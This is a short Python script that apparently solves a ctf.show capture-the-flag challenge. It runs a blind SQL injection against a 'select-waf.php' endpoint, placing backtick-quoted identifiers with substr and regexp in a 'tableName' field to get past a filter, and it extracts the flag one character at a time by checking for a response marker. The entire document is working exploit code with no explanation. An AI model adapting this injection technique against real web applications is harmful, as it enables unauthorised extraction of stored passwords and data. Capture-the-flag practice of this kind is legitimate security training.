#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests

url = 'http://ab51c8c9-cb17-4e13-b34a-e291ccc9bbb9.challenge.ctf.show:8080/select-waf.php'
flagstr = '{ctfshowabdegijklmnpqruvxyz1234567890-}'
payload = '`ctfshow_user`where(substr(`pass`,{},1))regexp(\'{}\')'
flag='ctfshow{'

for i in range(9,100):
    for z in flagstr:
        data = {
            'tableName': payload.format(str(i),z)
        }
        rec = requests.post(url,data=data).text
        if "$user_count = 1;" in rec:
            flag+=z
            print(flag)
            if z == '}':
                break


